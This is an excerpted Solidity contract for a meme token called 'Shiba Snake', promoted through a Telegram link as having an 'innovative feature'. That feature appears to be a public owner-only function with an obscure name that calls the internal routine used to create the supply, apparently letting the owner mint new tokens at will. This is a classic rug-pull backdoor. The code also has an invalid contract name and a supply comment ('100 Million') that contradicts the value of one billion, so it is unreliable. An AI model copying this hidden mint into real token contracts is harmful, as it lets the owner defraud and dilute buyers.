...
//
// $ShibaSnake proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ShibaSnake
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ShibaSnake(uint256 amount) public onlyOwner {
 _ShibaSnake(msg.sender, amount);
    }
    ...
    function _ShibaSnake(address account, uint256 amount) internal virtual {
...
contract $ShibaSnake is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Shiba Snake", "SHIBASNAKE") {
     _ShibaSnake(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}